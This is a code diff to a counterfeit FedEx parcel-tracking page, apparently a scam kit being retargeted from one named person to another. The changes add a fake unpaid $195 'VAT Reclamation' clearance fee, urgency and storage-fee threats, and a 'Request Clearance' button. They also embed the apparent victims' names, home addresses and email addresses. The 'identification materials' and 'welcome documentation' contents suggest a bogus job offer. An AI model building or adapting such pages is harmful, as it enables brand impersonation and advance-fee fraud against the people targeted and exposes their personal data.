@@ -272,16 +272,16 @@
       border: 1px solid #FCD34D;
     }
 
-    .status-cleared {
+    .status-awaiting-clearance {
+      background: #FECACA;
+      color: #B91C1C;
+      border: 1px solid #FCA5A5;
+    }
+
+    .status-in-transit {
       background: #DBEAFE;
       color: #1E40AF;
       border: 1px solid #93C5FD;
-    }
-
-    .status-out-for-delivery {
-      background: #FEF3C7;
-      color: #B45309;
-      border: 1px solid #FCD34D;
     }
 
     .status-delivered {
@@ -1277,7 +1277,7 @@
       <div class="p-3 sm:p-6" id="modal-content">
         <div class="flex justify-center items-center py-12">
           <div class="loading-spinner mr-3"></div>
-          <span>Loading package information for Steven Venditti — Expected delivery: Out for delivery - By end of day</span>
+          <span>Loading package information for Denise Trumbauer — Expected delivery: Pending clearance - Due by January 10, 2026</span>
         </div>
       </div>
     </div>
@@ -1349,69 +1349,70 @@
     const mockData = {
       packages: [
         {
-          tracking_number: 'FD26031998KR',
-          status: 'out-for-delivery',
-          service_type: 'FedEx International Priority',
-          current_location: 'Toronto, ON - On vehicle for delivery',
-          estimated_delivery: 'Today by end of day',
-          ship_date: '2026-01-09',
-          weight: '2840',
-          dimensions: '72" x 84" x 48"',
-          declared_value: 30000.00,
-          contents: '$30,000 (high-value electronics & collectibles)',
-          reference_number: 'HIGH-VALUE-SHIPMENT',
-          insurance_coverage: 30000.00,
-          progress_percentage: 95,
+          tracking_number: '7946 3210 5843',
+          status: 'awaiting_clearance',
+          service_type: 'Priority Same-Day Air',
+          current_location: 'Springfield, NJ Distribution Center - 45 miles from Atlantic City, NJ',
+          estimated_delivery: 'Pending clearance - Due by January 10, 2026',
+          ship_date: '2026-01-07',
+          weight: '4.5',
+          dimensions: '12" x 9" x 3"',
+          declared_value: 850.00,
+          contents: 'Identification materials and printed documents, including identification card, card holder, lanyard, instruction materials, reference card, and welcome documentation',
+          reference_number: 'CORP-ID-MATERIALS-DT',
+          insurance_coverage: 1000.00,
+          progress_percentage: 85,
           requires_clearance: true,
-          clearance_fee: 500.00,
-          clearance_reference: 'CLR-2026-8793',
-          clearance_reason: 'International customs clearance completed',
-          sender_name: 'Steven Venditti',
-          sender_company: '',
-          sender_address: '1 Rocket Road',
-          sender_city: 'Hawthorne, TX 90250, United States',
+          clearance_due_date: '2026-01-10',
+          clearance_fee: 195.00,
+          clearance_reference: 'CLR-2026-8452-DT',
+          clearance_reason: 'Corporate International VAT Reclamation Processing Fee',
+          sender_name: 'Corporate Services',
+          sender_company: 'Lions Gate Corporation',
+          sender_address: '2701 S. 15th Ave',
+          sender_city: 'Phoenix, AZ 85007',
           sender_phone: '',
-          recipient_name: 'Steven Venditti',
-          recipient_address: '32 Rory Road',
-          recipient_city: 'Toronto, Ontario, Canada M6L 3G2',
+          recipient_name: 'Denise Trumbauer',
+          recipient_address: '653 N Annapolis Ave',
+          recipient_city: 'Atlantic City, NJ 08401',
           recipient_phone: '',
-          recipient_email: 'stevenvenditti20@gmail.com',
+          recipient_email: 'denisetrumbauer@gmail.com',
           carrier: 'FedEx Express',
-          transport_state: 'OUT FOR DELIVERY - YOUR DRIVER IS ON THE WAY'
+          transport_state: 'ARRIVED AT DESTINATION CLEARANCE FACILITY - FINAL CLEARANCE PENDING'
         }
       ],
       
       tracking_events: 
   [
   {
-    tracking_number: 'FD26031998KR',
+    tracking_number: '7946 3210 5843',
     status: 'registered',
-    location: 'TORONTO, CA - FedEx Facility',
-    event_date: '2026-01-09',
-    event_time: '13:45:00',
-    description: 'Package has been registered at the FedEx facility and secured. Awaiting recipient clearance for processing.',
+    location: 'PHOENIX, AZ - Origin Facility',
+    event_date: '2026-01-07',
+    event_time: '08:15:00',
+    description: 'Package registered at origin facility in Phoenix, AZ. Preparing for air transport.',
     is_latest: false,
     event_type: 'status_update'
   },
   {
-    tracking_number: 'FD26031998KR',
-    status: 'cleared',
-    location: 'TORONTO, CA - Customs Clearance Center',
-    event_date: '2026-01-10',
-    event_time: '08:30:00',
-    description: 'Shipment cleared through customs processing. Package released for final delivery routing.',
+    tracking_number: '7946 3210 5843',
+    status: 'awaiting_clearance',
+    location: 'MEMPHIS, TN - Air Operations Hub',
+    event_date: '2026-01-08',
+    event_time: '14:45:00',
+    description: 'Package cleared through processing at Memphis Air Operations Hub and forwarded to the aircraft.',
     is_latest: false,
     event_type: 'clearance'
   },
   {
-    tracking_number: 'FD26031998KR',
-    status: 'out-for-delivery',
-    location: 'TORONTO, ON - Delivery Vehicle',
-    event_date: '2026-01-10',
-    event_time: '09:36:00',
-    description: 'Package loaded onto delivery vehicle. Your driver is on the way to your address.',
+    tracking_number: '7946 3210 5843',
+    status: 'awaiting_clearance',
+    location: 'SPRINGFIELD, NJ - Distribution Center',
+    event_date: '2026-01-09',
+    event_time: '14:30:00',
+    description: 'Package arrived at destination clearance facility - Final customs/tax clearance pending. Location: 45 miles from Atlantic City, NJ',
     is_latest: true,
-    event_type: 'out_for_delivery'
+    event_type: 'arrival'
   }
 ],
 
@@ -1460,7 +1461,7 @@
         },
         {
           question: 'What is a clearance request for international packages?',
-          answer: 'International shipments require customs verification and approval before they can proceed through processing to their destination.',
+          answer: 'Confidential shipments may require recipient verification and approval before they can proceed through processing to their destination.',
           category: 'clearance',
           display_order: 2
         },
@@ -1523,7 +1524,7 @@
         modalContent.innerHTML = `
           <div class="flex justify-center items-center py-12">
             <div class="loading-spinner mr-3"></div>
-            <span>Loading package information for Steven Venditti — Expected delivery: Out for delivery - By end of day</span>
+            <span>Loading package information for Denise Trumbauer — Expected delivery: Pending clearance - Due by January 10, 2026</span>
           </div>
         `;
 
@@ -1571,8 +1572,9 @@
     function generateTrackingContent(data) {
       const progressSteps = [
         { name: 'Registered', icon: 'check', status: getStepStatus('registered', data.status) },
-        { name: 'Cleared', icon: 'clipboard-check', status: getStepStatus('cleared', data.status) },
-        { name: 'Out for Delivery', icon: 'truck', status: getStepStatus('out-for-delivery', data.status) },
+        { name: 'Cleared', icon: 'clipboard-check', status: getStepStatus('awaiting_clearance', data.status) },
+        { name: 'Arrived', icon: 'map-marker-alt', status: getStepStatus('arrived', data.status) },
+        { name: 'Clearance', icon: 'unlock', status: getStepStatus('awaiting_clearance', data.status) },
         { name: 'Delivered', icon: 'home', status: getStepStatus('delivered', data.status) }
       ];
 
@@ -1600,8 +1602,8 @@
                 <i class="fas fa-envelope mr-1 sm:mr-2"></i>Email Updates
               </button>
               ${data.requires_clearance ? `
-              <button onclick="window.location.href='mailto:helpfedexparcel@gmail.com'" class="bg-fedex-blue text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors text-xs sm:text-base w-full sm:w-auto">
-                <i class="fas fa-headset mr-1 sm:mr-2"></i>Contact Support
+              <button onclick="requestClearance('${data.tracking_number}')" class="bg-fedex-blue text-white px-3 sm:px-6 py-2 sm:py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors text-xs sm:text-base w-full sm:w-auto">
+                <i class="fas fa-unlock mr-1 sm:mr-2"></i>Request Clearance
               </button>
               ` : ''}
             </div>
@@ -1618,22 +1620,21 @@
             </div>
           </div>
 
-          ${data.status === 'out-for-delivery' ? `
-          <!-- Delivery Notice -->
-          <div class="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
+          ${data.requires_clearance && data.status === 'awaiting_clearance' ? `
+          <!-- Clearance Notice -->
+          <div class="clearance-notice rounded-lg p-3 sm:p-4">
             <div class="flex items-start space-x-2 sm:space-x-3">
-              <i class="fas fa-truck text-green-600 text-lg sm:text-xl mt-1"></i>
+              <i class="fas fa-info-circle text-yellow-600 text-lg sm:text-xl mt-1"></i>
               <div>
-                <h4 class="font-bold text-green-800 mb-1 sm:mb-2 text-sm sm:text-base">OUT FOR DELIVERY - SCHEDULED DELIVERY DATE</h4>
-                <p class="text-green-700 text-xs sm:text-sm">
-                  <strong>Today</strong><br>
-                  <strong>By end of day</strong><br><br>
-                  Your driver is on the way to: ${data.recipient_address}, ${data.recipient_city}
+                <h4 class="font-bold text-yellow-800 mb-1 sm:mb-2 text-sm sm:text-base">CLEARANCE REQUIRED - URGENT</h4>
+                <p class="text-yellow-700 text-xs sm:text-sm">
+                  Final clearance must be completed by end of day tomorrow (January 10, 2026) to avoid $25/day storage fees.
                 </p>
                 <div class="mt-2 text-xs sm:text-sm">
-                  <p><strong>Clearance Status:</strong> Completed ✓</p>
-                  <p><strong>Fee Paid:</strong> $${data.clearance_fee}.00 ✓</p>
-                  <p><strong>Driver Status:</strong> En route to destination</p>
+                  <p><strong>Clearance Fee:</strong> $${data.clearance_fee}.00</p>
+                  <p><strong>Reference:</strong> ${data.clearance_reference}</p>
+                  <p><strong>Reason:</strong> ${data.clearance_reason}</p>
+                  <p><strong>Due Date:</strong> ${data.clearance_due_date} (1 day remaining)</p>
                 </div>
               </div>
             </div>
@@ -1644,7 +1645,7 @@
         <!-- Progress Steps -->
         <div class="mb-6 sm:mb-8">
           <h3 class="text-base sm:text-xl font-bold text-fedex-dark-gray mb-4 sm:mb-6">Shipment Journey</h3>
-          <div class="grid grid-cols-2 sm:grid-cols-4 gap-1 sm:gap-4">
+          <div class="grid grid-cols-3 sm:grid-cols-5 gap-1 sm:gap-4">
             ${progressSteps.map(step => `
               <div class="progress-step ${step.status} text-center">
                 <div class="w-6 h-6 sm:w-12 sm:h-12 ${step.status === 'completed' ? 'bg-fedex-green' : step.status === 'current' ? 'bg-fedex-orange' : 'bg-gray-300'} rounded-full flex items-center justify-center mx-auto mb-1 sm:mb-2 relative z-10">
@@ -1692,7 +1693,7 @@
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Weight:</span>
-                  <span class="font-semibold">${data.weight} lbs</span>
+                  <span class="font-semibold">${data.weight} kg</span>
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Dimensions:</span>
@@ -1704,7 +1705,7 @@
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Contents:</span>
-                  <span class="font-semibold">${data.contents}</span>
+                  <span class="font-semibold">Identification materials and printed documents</span>
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Reference:</span>
@@ -1713,7 +1714,7 @@
                 ${data.clearance_fee ? `
                 <div class="flex justify-between border-t pt-2">
                   <span class="text-fedex-gray">Clearance Fee:</span>
-                  <span class="font-semibold text-green-600">$${data.clearance_fee}.00 ✓ PAID</span>
+                  <span class="font-semibold text-red-600">$${data.clearance_fee}.00</span>
                 </div>
                 <div class="flex justify-between">
                   <span class="text-fedex-gray">Fee Reference:</span>
@@ -1730,6 +1731,7 @@
                 <div>
                   <h4 class="font-semibold text-fedex-gray mb-1 sm:mb-2">From:</h4>
                   <p class="text-fedex-dark-gray font-semibold">${data.sender_name}</p>
+                  <p class="text-fedex-gray">${data.sender_company}</p>
                   <p class="text-fedex-gray">${data.sender_address}</p>
                   <p class="text-fedex-gray">${data.sender_city}</p>
                 </div>
@@ -1738,6 +1740,7 @@
                   <p class="text-fedex-dark-gray font-semibold">${data.recipient_name}</p>
                   <p class="text-fedex-gray">${data.recipient_address}</p>
                   <p class="text-fedex-gray">${data.recipient_city}</p>
+                  <p class="text-fedex-gray">Phone: ${data.recipient_phone}</p>
                   <p class="text-fedex-gray">Email: ${data.recipient_email}</p>
                 </div>
               </div>
@@ -1752,14 +1755,14 @@
                 <div class="relative w-full h-full">
                   <div class="route-line"></div>
                   <div class="route-marker origin"></div>
-                  <div class="route-marker current" style="left: 90%;"></div>
+                  <div class="route-marker current" style="left: 70%;"></div>
                   <div class="route-marker destination"></div>
 
                   <div class="absolute top-2 sm:top-4 left-2 sm:left-4 bg-white px-2 py-1 rounded-full text-xs font-semibold text-fedex-purple shadow">
-                    <i class="fas fa-map-pin mr-1"></i> Hawthorne, TX
+                    <i class="fas fa-map-pin mr-1"></i> Phoenix, AZ
                   </div>
                   <div class="absolute top-2 sm:top-4 right-2 sm:right-4 bg-white px-2 py-1 rounded-full text-xs font-semibold text-fedex-green shadow">
-                    <i class="fas fa-home mr-1"></i> Toronto, ON
+                    <i class="fas fa-home mr-1"></i> Atlantic City, NJ
                   </div>
 
                   <div class="absolute bottom-2 sm:bottom-4 left-1/2 transform -translate-x-1/2 bg-white px-2 sm:px-4 py-1 sm:py-2 rounded-lg shadow text-center">
@@ -1773,15 +1776,14 @@
         </div>
 
         ${data.declared_value >= 5000 ? `
-        <!-- High-Value Shipment Notice -->
+        <!-- Confidential Shipment Notice -->
         <div class="mt-4 sm:mt-8 bg-blue-50 border border-blue-200 rounded-lg p-3 sm:p-6">
           <div class="flex items-start space-x-2 sm:space-x-3">
-            <i class="fas fa-shield-alt text-blue-600 text-lg sm:text-xl mt-1"></i>
+            <i class="fas fa-file-contract text-blue-600 text-lg sm:text-xl mt-1"></i>
             <div>
-              <h4 class="font-semibold text-blue-800 mb-1 sm:mb-2 text-sm sm:text-base">High-Value Shipment</h4>
+              <h4 class="font-semibold text-blue-800 mb-1 sm:mb-2 text-sm sm:text-base">Confidential Corporate Materials</h4>
               <p class="text-blue-700 text-xs sm:text-sm">
-                This shipment contains high-value items ($${data.declared_value.toLocaleString()}) and has been cleared through customs. 
-                Signature required upon delivery.
+                This shipment contains confidential corporate identification materials and documents requiring secure handling and tracking.
               </p>
             </div>
           </div>
@@ -1804,7 +1806,7 @@
       const subject = `Clearance Request for Package ${trackingNumber} - URGENT`;
       const body = `Dear FedEx Team,
 
-I am requesting clearance for my package with tracking number: ${trackingNumber}
+I am requesting clearance for my corporate materials package with tracking number: ${trackingNumber}
 
 Package Details:
 - Tracking Number: ${trackingNumber}
@@ -1821,7 +1823,7 @@ Recipient Information:
 - Phone: ${packageData.recipient_phone}
 - Email: ${packageData.recipient_email}
 
-I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process. I understand the $${packageData.clearance_fee}.00 fee must be paid to avoid storage fees.
+I confirm that I am the intended recipient of this package and authorize FedEx to proceed with the clearance process. I understand the $${packageData.clearance_fee}.00 fee must be paid by January 10, 2026 to avoid storage fees.
 
 Please let me know if you need any additional documentation or verification.
 
@@ -1966,15 +1968,15 @@ ${packageData.recipient_name}`;
         
         yPos += 15;
         doc.setFontSize(11);
-        doc.text(`Weight: ${packageData.weight} lbs`, 20, yPos);
+        doc.text(`Weight: ${packageData.weight} kg`, 20, yPos);
         yPos += 10;
         doc.text(`Dimensions: ${packageData.dimensions}`, 20, yPos);
         yPos += 10;
         doc.text(`Declared Value: $${packageData.declared_value.toLocaleString()} USD`, 20, yPos);
         yPos += 10;
-        doc.text(`Contents: ${packageData.contents}`, 20, yPos);
+        doc.text(`Contents: Identification materials and printed documents`, 20, yPos);
         yPos += 10;
-        doc.text(`Clearance Fee: $${packageData.clearance_fee}.00 (PAID)`, 20, yPos);
+        doc.text(`Clearance Fee: $${packageData.clearance_fee}.00`, 20, yPos);
         yPos += 10;
         doc.text(`Clearance Reference: ${packageData.clearance_reference}`, 20, yPos);
 
@@ -1987,6 +1989,8 @@ ${packageData.recipient_name}`;
         doc.text('From:', 20, yPos);
         yPos += 10;
         doc.text(`${packageData.sender_name}`, 25, yPos);
+        yPos += 8;
+        doc.text(`${packageData.sender_company}`, 25, yPos);
         yPos += 8;
         doc.text(`${packageData.sender_address}`, 25, yPos);
         yPos += 8;
@@ -2006,13 +2010,15 @@ ${packageData.recipient_name}`;
         doc.setFontSize(12);
         doc.text('Progress:', 20, yPos);
         yPos += 8;
-        doc.text(`Registered (Jan 9): ✓`, 25, yPos);
+        doc.text(`Registered (Jan 7): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Cleared (Jan 10): ✓`, 25, yPos);
+        doc.text(`Cleared (Jan 8): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Out for Delivery (Jan 10): ✓`, 25, yPos);
+        doc.text(`Arrived (Jan 9): ✓`, 25, yPos);
         yPos += 7;
-        doc.text(`Delivery Expected: Today by end of day`, 25, yPos);
+        doc.text(`Clearance Due: Jan 10, 2026`, 25, yPos);
+        yPos += 7;
+        doc.text(`Urgency: 1 day remaining to avoid fees`, 25, yPos);
 
         yPos = 270;
         doc.setFontSize(10);
@@ -2031,7 +2037,7 @@ ${packageData.recipient_name}`;
 
     // Utility Functions
     function getStepStatus(stepStatus, currentStatus) {
-      const statusOrder = ['registered', 'cleared', 'out-for-delivery', 'delivered'];
+      const statusOrder = ['registered', 'awaiting_clearance', 'arrived', 'out_for_delivery', 'delivered'];
       const stepIndex = statusOrder.indexOf(stepStatus);
       const currentIndex = statusOrder.indexOf(currentStatus);
       
@@ -2043,8 +2049,10 @@ ${packageData.recipient_name}`;
     function getStatusClass(status) {
       const statusClasses = {
         'registered': 'status-registered',
-        'cleared': 'status-cleared',
-        'out-for-delivery': 'status-out-for-delivery',
+        'awaiting_clearance': 'status-awaiting-clearance',
+        'arrived': 'status-in-transit',
+        'in_transit': 'status-in-transit',
+        'out_for_delivery': 'status-in-transit',
         'delivered': 'status-delivered'
       };
       return statusClasses[status] || 'status-registered';
@@ -2053,15 +2061,17 @@ ${packageData.recipient_name}`;
     function getStatusIcon(status) {
       const statusIcons = {
         'registered': 'check-circle',
-        'cleared': 'check-circle',
-        'out-for-delivery': 'truck',
+        'awaiting_clearance': 'clock',
+        'arrived': 'map-marker-alt',
+        'in_transit': 'truck',
+        'out_for_delivery': 'shipping-fast',
         'delivered': 'check-circle'
       };
       return statusIcons[status] || 'info-circle';
     }
 
     function formatStatus(status) {
-      if (status === 'out-for-delivery') return 'Out for Delivery';
+      if (status === 'awaiting_clearance') return 'Awaiting Final Clearance';
       return status.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
     }
 
